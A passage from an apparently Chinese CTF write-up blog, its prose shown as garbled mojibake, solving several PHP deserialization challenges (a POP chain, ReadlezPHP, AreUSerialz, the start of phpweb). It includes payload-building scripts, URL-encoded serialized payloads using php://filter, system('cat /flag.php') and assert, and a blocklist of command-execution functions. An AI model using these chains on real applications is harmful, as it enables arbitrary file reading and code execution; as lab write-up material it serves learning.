class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker&quot;;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;p;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;pop&#x27;]))&#123;</span><br><span class="line">    @unserialize($_GET[&#x27;pop&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $a=new Show;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2.æ ¹æ®æç¤ºçŸ¥é“flagåœ¨flag.phpä¸­ï¼Œæ‰€ä»¥å…ˆæ‰¾èƒ½æ‰“å¼€æ–‡ä»¶çš„å‡½æ•°ï¼Œå‘ç°åœ¨Modifierç±»ä¸­çš„includeå‡½æ•°å¯ä»¥æ‰“å¼€æ–‡ä»¶</p>
<p>3.æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„æ˜¯popå‚æ•°ï¼Œä½¿ç”¨ååºåˆ—åŒ–æ—¶ï¼Œ<code>__wakeup</code>ä¼šè‡ªåŠ¨ä½¿ç”¨ï¼Œå…¶ä¸­çš„<code>prag_match</code>å¯ä»¥æ­£åˆ™åŒ¹é…ï¼Œå°†$this-&gt;sourceå½“åšå­—ç¬¦ä¸²ä½¿ç”¨ï¼Œæ­¤æ—¶<code>__toString</code>æ–¹æ³•ä¼šè‡ªåŠ¨è°ƒç”¨ï¼Œçœ‹<code>$this-&gt;str-&gt;source</code>ï¼Œå¦‚æœsourceä¸ºç©ºå°±ä¼šè‡ªåŠ¨è°ƒç”¨<code>__get</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä¸­çš„<code>$function = $this-&gt;p;return $function();</code>å°†å±æ€§å½“åšå‡½æ•°ä½¿ç”¨ä¼šè‡ªåŠ¨è°ƒç”¨<code>__invoke</code>ï¼Œä»è€Œå°±å¯ä»¥ä½¿ç”¨includeå‡½æ•°</p>
<p>4.è¿™å°±æ˜¯è¿™ä¸ªé¢˜çš„æ€è·¯ï¼Œä½†æ„é€ payloadæ—¶å°è¯•äº†å¤šæ¬¡éƒ½æ— æ³•å›æ˜¾flag.phpï¼Œçœ‹wpï¼Œå‘ç°éœ€è¦ä½¿ç”¨phpä¼ªåè®®ï¼Œä½†ä¾ç„¶ä¸ä¼šæ„é€ payloadï¼Œç›´æ¥çœ‹wpæ€ä¹ˆæ¥å†™phpæ¥æ„é€ çš„ï¼Œçœ‹å®Œè¿˜æ˜¯æœ‰ç‚¹ä¸å¤ªæ‡‚</p>
<p>5.ä½¿ç”¨phpæ„é€ payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var = &#x27;php://filter/read=convert.base64-encode/resource=./flag.php&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">&#125;</span><br><span class="line">$show = new Show();</span><br><span class="line">$show-&gt;source = new Show();</span><br><span class="line">$show-&gt;source-&gt;str = new Test();</span><br><span class="line">$show-&gt;source-&gt;str-&gt;p = new Modifier();</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($show));</span><br><span class="line">è¾“å‡º</span><br><span class="line">O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A59%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3D.%2Fflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D</span><br></pre></td></tr></table></figure>

<p>6.è¿™æ ·ä¼šè¾“å‡ºflag.phpçš„base64ç¼–ç ï¼Œä½¿ç”¨è§£ç å¾—åˆ°flag</p>
<h3 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h3><p>1.æ‰“å¼€ç½‘é¡µåä»€ä¹ˆéƒ½æ²¡æœ‰æ˜¾ç¤ºï¼Œç„¶åå»å¯»æ‰¾æºä»£ç ï¼Œå‘ç°</p>
<p>![](.&#x2F;hello-world&#x2F;image-20221120145057014 - å‰¯æœ¬.png)</p>
<p>2.ç‚¹å‡»<a href="http://e6088c9b-34a2-41da-b9cc-dcd6aacb32c7.node4.buuoj.cn:81/time.php?source">.&#x2F;time.php?source</a>ï¼Œæ˜¾ç¤ºå‡ºæ­¤é¢˜çš„æºä»£ç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#error_reporting(0);</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;a = &quot;Y-m-d h:i:s&quot;;</span><br><span class="line">        $this-&gt;b = &quot;date&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $a = $this-&gt;a;</span><br><span class="line">        $b = $this-&gt;b;</span><br><span class="line">        echo $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = new HelloPhp;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;source&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    die(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp = unserialize($_GET[&quot;data&quot;]);</span><br></pre></td></tr></table></figure>

<p>3.è§‚å¯Ÿä½¿ç”¨sourceèµ·ä¸äº†ä½œç”¨ï¼Œä¼ å‚dataå¯ä»¥ä½¿ç”¨ååºåˆ—åŒ–ï¼Œç„¶åä¼šè‡ªåŠ¨è°ƒç”¨__destruct()æ–¹æ³•ï¼Œè§‚å¯Ÿåˆ°è¯¥æ–¹æ³•ä¸­çš„<code>echo $b($a)</code>ï¼Œæƒ³åˆ°å¦‚æœ$bæ˜¯systemï¼Œ$aæ˜¯cat &#x2F;flag.phpï¼Œé‚£ä¹ˆå°±å˜æˆäº†echo system(cat &#x2F;flag.php)ï¼Œè¿™æ ·å°±å¯ä»¥å¾—åˆ°flagäº†</p>
<p>4.ä½¿ç”¨phpæ„é€ payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class HelloPhp&#123;</span><br><span class="line">    public $a=&quot;cat /flag.php&quot;;</span><br><span class="line">    public $b=&quot;system&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$e = new HelloPhp;</span><br><span class="line">echo urlencode(serialize($e));</span><br><span class="line">è¾“å‡º</span><br><span class="line">O%3A8%3A%22HelloPhp%22%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A13%3A%22cat+%2Fflag.php%22%3Bs%3A1%3A%22b%22%3Bs%3A6%3A%22system%22%3B%7D</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯å¹¶æ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œäºæ˜¯çœ‹wpï¼Œå‘ç°systemä¸èƒ½ä½¿ç”¨ï¼Œéœ€è¦ä½¿ç”¨assertï¼Œå¹¶ä¸”ä¹Ÿä¸æ˜¯ä½¿ç”¨cat &#x2F;flag.phpï¼Œè€Œæ˜¯phpinfo()ï¼Œäºæ˜¯å†æ¬¡æ„é€ </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class HelloPhp&#123;</span><br><span class="line">    public $a=&quot;phpinfo()&quot;;</span><br><span class="line">    public $b=&quot;assert&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$e = new HelloPhp;</span><br><span class="line">echo urlencode(serialize($e));</span><br><span class="line">è¾“å‡º</span><br><span class="line">O%3A8%3A%22HelloPhp%22%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A9%3A%22phpinfo%28%29%22%3Bs%3A1%3A%22b%22%3Bs%3A6%3A%22assert%22%3B%7D</span><br></pre></td></tr></table></figure>

<p>5.è¿™æ ·æ­£ç¡®å¾—åˆ°äº†phpçš„ç‰ˆæœ¬<img src="/2022/12/03/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/image-2022112015000.png"></p>
<p>6.ä½¿ç”¨ctrl+FæŸ¥æ‰¾flagï¼Œäºæ˜¯æŸ¥æ‰¾åˆ°äº†flag</p>
<h3 id="ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz"><a href="#ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz" class="headerlink" title="[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz"></a>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</h3><p>1.æ‰“å¼€æ˜¾ç¤ºè¯¥é¢˜çš„æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>((<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_valid</span>(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2.é¦–å…ˆè§‚å¯Ÿåˆ°å¯ä»¥åˆ©ç”¨çš„æ˜¯strï¼Œä¼ å‚stråï¼Œis_valid($s)å‡½æ•°ä¼šæ£€æŸ¥æ²¡ä¸€ä¸ªçš„asciiå€¼æ˜¯å¦åœ¨32å’Œ125ä¹‹é—´ï¼Œåœ¨çš„è¯å°±æ˜¾ç¤ºtureï¼Œä¸åœ¨å°±æ˜¯flase</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function is_valid($s) &#123;</span><br><span class="line">    for($i = 0; $i &lt; strlen($s); $i++)</span><br><span class="line">        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))</span><br><span class="line">            return false;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæ˜¾ç¤ºtrueï¼Œå°†ä¼šè¿›è¡Œååºåˆ—åŒ–ï¼Œç„¶å__destruct()å‡½æ•°ä¼šè‡ªåŠ¨è°ƒç”¨ï¼Œå¦‚æœå˜é‡opç±»å‹æ˜¯å­—ç¬¦ä¸²ï¼Œå€¼ä¸º2ï¼Œå°±ä¼šç»™opèµ‹å€¼ä¸ºâ€1â€ï¼Œcontentèµ‹å€¼ä¸ºç©ºï¼Œè¿›è¡Œprocess()å‡½æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function __destruct() &#123;</span><br><span class="line">        if($this-&gt;op === &quot;2&quot;)</span><br><span class="line">            $this-&gt;op = &quot;1&quot;;</span><br><span class="line">        $this-&gt;content = &quot;&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>çœ‹process()å‡½æ•°ï¼Œå¦‚æœåªè¦opçš„æ•°å€¼ç­‰äº1ï¼Œå°±ä¼šè°ƒç”¨write()å‡½æ•°ï¼Œåªè¦opçš„æ•°å€¼ç­‰äº2ï¼Œå°±ä¼šè°ƒç”¨read()å‡½æ•°ï¼Œç„¶åå†è°ƒç”¨outputå‡½æ•°ï¼Œå¦‚æœéƒ½ä¸ç­‰äºå°±ä¼šè¿”å›Bad Hacker!</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function process() &#123;</span><br><span class="line">        if($this-&gt;op == &quot;1&quot;) &#123;</span><br><span class="line">            $this-&gt;write();</span><br><span class="line">        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;</span><br><span class="line">            $res = $this-&gt;read();</span><br><span class="line">            $this-&gt;output($res);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Bad Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡çœ‹writeå‡½æ•°ï¼Œå‘ç°å¹¶ä¸èƒ½ä½¿ç”¨æ¥æ‰§è¡Œè‡ªå·±æ‰€éœ€çš„ä»£ç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private function write() &#123;</span><br><span class="line">        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;</span><br><span class="line">            if(strlen((string)$this-&gt;content) &gt; 100) &#123;</span><br><span class="line">                $this-&gt;output(&quot;Too long!&quot;);</span><br><span class="line">                die();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents($this-&gt;filename, $this-&gt;content);</span><br><span class="line">            if($res) $this-&gt;output(&quot;Successful!&quot;);</span><br><span class="line">            else $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>readå‡½æ•°ï¼Œå¯ä»¥ç»™$resä¼ å‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private function read() &#123;</span><br><span class="line">        $res = &quot;&quot;;</span><br><span class="line">        if(isset($this-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents($this-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        return $res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>3.æ€è·¯</p>
<p>ç»™strä¼ å‚ï¼Œç„¶åè°ƒç”¨__destruct()å‡½æ•°ï¼Œå†è°ƒç”¨process()å‡½æ•°ï¼Œç„¶åè°ƒç”¨read()å‡½æ•°ï¼Œåˆ©ç”¨filenameå˜é‡ï¼Œèµ‹å€¼ç»™$resç„¶åæ‰§è¡Œoutput()å‡½æ•°ï¼Œæ‰§è¡Œecho $s;</p>
<p>4.å†™payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class FileHandler</span><br><span class="line">&#123;</span><br><span class="line">    public $op=2;</span><br><span class="line">    public $filename=&#x27;php://filter/read=convert.base64-encode/resource=./flag.php&#x27;;</span><br><span class="line">    public $content;</span><br><span class="line">&#125;</span><br><span class="line">$a=new FileHandler();</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">è¾“å‡º</span><br><span class="line">O%3A11%3A%22FileHandler%22%3A3%3A%7Bs%3A2%3A%22op%22%3Bi%3A2%3Bs%3A8%3A%22filename%22%3Bs%3A59%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3D.%2Fflag.php%22%3Bs%3A7%3A%22content%22%3BN%3B%7D</span><br></pre></td></tr></table></figure>

<p>5.å†urlå¤„å†™å…¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?str=O%3A11%3A&quot;FileHandler&quot;%3A3%3A%7Bs%3A2%3A&quot;op&quot;%3Bi%3A2%3Bs%3A8%3A&quot;filename&quot;%3Bs%3A59%3A&quot;php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3D.%2Fflag.php&quot;%3Bs%3A7%3A&quot;content&quot;%3BN%3B%7D</span><br></pre></td></tr></table></figure>

<p>6.å¾—åˆ°base64ç¼–ç ï¼Œè¿›è¡Œè§£ç å¾—åˆ°flag</p>
<h3 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb</h3><p>1.åˆšæ‰“å¼€ç½‘é¡µçœ‹åˆ°æœ‰ä¸€æ®µ<strong>Warning</strong>ï¼Œå¤§æ¦‚ç¿»è¯‘æ˜¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¾èµ–ç³»ç»Ÿçš„æ—¶åŒºè®¾ç½®æ˜¯ä¸å®‰å…¨çš„ã€‚æ‚¨éœ€è¦ä½¿ç”¨ date.timezone è®¾ç½®æˆ– date_default_timezone_setï¼ˆï¼‰ å‡½æ•°ã€‚å¦‚æœæ‚¨ä½¿ç”¨äº†å…¶ä¸­ä»»ä½•ä¸€ç§æ–¹æ³•ï¼Œä½†ä»ç„¶æ”¶åˆ°æ­¤è­¦å‘Šï¼Œåˆ™å¾ˆå¯èƒ½æ‹¼å†™é”™äº†æ—¶åŒºæ ‡è¯†ç¬¦ã€‚æˆ‘ä»¬ç›®å‰é€‰æ‹©äº†æ—¶åŒºâ€œUTCâ€ï¼Œä½†è¯·è®¾ç½® date.timezone ä»¥é€‰æ‹©æ‚¨çš„æ—¶åŒºã€‚</span><br></pre></td></tr></table></figure>

<p>2.è¿˜ä»¥ä¸ºéœ€è¦åˆ©ç”¨date.timezoneæ¥è§£é¢˜å‘¢ï¼Œç”¨äº†åŠå¤©å¹¶æ²¡æœ‰ä»€ä¹ˆåµç”¨</p>
<p>3.ç„¶åçœ‹wpï¼Œå¯ä»¥ä½¿ç”¨burpè¿›è¡ŒæŠ“åŒ…ï¼ŒæŠ“åŒ…åå‘ç°å¯ä»¥ä¼ å‚funcå’Œpï¼Œç„¶åä¼ func&#x3D;file_get_contents&amp;p&#x3D;index.phpå‘ç°å¾—åˆ°äº†æºä»£ç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file_get_contents() å‡½æ•°æ˜¯ç”¨äºå°†æ–‡ä»¶çš„å†…å®¹è¯»å…¥åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);</span><br><span class="line">function gettime($func, $p) &#123;</span><br><span class="line">    $result = call_user_func($func, $p);</span><br><span class="line">    $a= gettype($result);//è·å–å˜é‡ç±»å‹</span><br><span class="line">    if ($a == &quot;string&quot;) &#123;</span><br><span class="line">        return $result;</span><br><span class="line">    &#125; else &#123;return &quot;&quot;;&#125;</span><br><span class="line">&#125;</span><br><span class="line">class Test &#123;</span><br><span class="line">    var $p = &quot;Y-m-d h:i:s a&quot;;</span><br><span class="line">    var $func = &quot;date&quot;;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        if ($this-&gt;func != &quot;&quot;) &#123;</span><br><span class="line">            echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$func = $_REQUEST[&quot;func&quot;];</span><br><span class="line">$p = $_REQUEST[&quot;p&quot;];</span><br><span class="line"></span><br><span class="line">if ($func != null) &#123;</span><br><span class="line">    $func = strtolower($func);</span><br><span class="line">    if (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">        echo gettime($func, $p);</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">        die(&quot;Hacker...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>4.æ¥ä¸‹æ¥ä¸çœ‹wpï¼Œè‡ªå·±åˆ†æäº†ä¸€ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ($func != null) &#123;</span><br><span class="line">    $func = strtolower($func);</span><br><span class="line">    if (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">        echo gettime($func, $p);</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">        die(&quot;Hacker...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä¼šåˆ¤æ–­$funcå†…çš„å†…å®¹æ˜¯å¦ä¸ºç©ºï¼Œå¹¶ä¸”å…¶ä¸­çš„å†…å®¹åœ¨$disable_funä¸­æœ‰æ²¡æœ‰ï¼Œå¦‚æœéƒ½é€šè¿‡å°±æ‰§è¡Œ<code>echo gettime($func, $p);</code>ï¼Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function gettime($func, $p) &#123;</span><br><span class="line">    $result = call_user_func($func, $p);</span><br><span class="line">    $a= gettype($result);//è·å–å˜é‡ç±»å‹</span><br><span class="line">    if ($a == &quot;string&quot;) &#123;</span><br><span class="line">        return $result;</span><br><span class="line">    &#125; else &#123;return &quot;&quot;;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

